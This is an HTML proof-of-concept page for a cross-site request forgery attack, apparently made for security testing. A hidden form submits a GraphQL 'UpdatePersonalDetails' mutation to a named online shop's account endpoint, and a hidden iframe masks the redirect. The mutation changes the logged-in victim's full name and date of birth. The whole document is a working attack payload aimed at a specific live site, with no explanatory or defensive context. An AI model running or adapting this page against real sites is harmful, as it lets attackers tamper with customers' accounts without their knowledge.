<!DOCTYPE html>
<html>
  <body>
    <h3>Manual CSRF PoC: Update Personal Details via GraphQL</h3>

    <form action="https://www.myvitamins.com/account/graphql?operationName=UpdatePersonalDetails" method="POST" target="csrf_iframe">
      <input type="hidden" name="query" value='mutation UpdatePersonalDetails($input: [SettingsFieldInput!]!) {
        updateAccountSettings(input: $input) {
          error
          fieldErrors {
            fieldName
            validators
            requiredButNotProvided
            invalidOption
          }
        }
      }'>
      <input type="hidden" name="variables" value='{"input":[{"fieldName":"fullName","value":"CSRF Manual"},{"fieldName":"dateOfBirth","value":"2000-01-01"}]}'>
      <input type="submit" value="Click to Submit CSRF">
    </form>

    <!-- Hidden iframe to avoid redirect -->
    <iframe name="csrf_iframe" style="display:none;"></iframe>
  </body>
</html>
